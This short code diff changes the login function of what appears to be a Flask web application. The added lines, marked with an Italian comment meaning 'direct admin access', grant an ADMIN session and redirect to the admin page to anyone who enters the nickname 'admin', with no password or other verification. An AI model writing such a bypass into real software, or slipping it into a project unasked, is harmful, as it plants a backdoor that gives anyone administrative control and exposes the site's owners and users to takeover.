@@ -64,6 +64,12 @@ def log_debug(msg):
 def login():
     if request.method == 'POST':
         nickname = request.form['nickname'].strip().upper()
+
+# Accesso Admin diretto
+        if nickname.lower() == "admin":
+           session['nickname'] = "ADMIN"
+           return redirect('/admin')
+
         if not nickname:
             flash("Please enter a valid nickname")
             return redirect('/login')
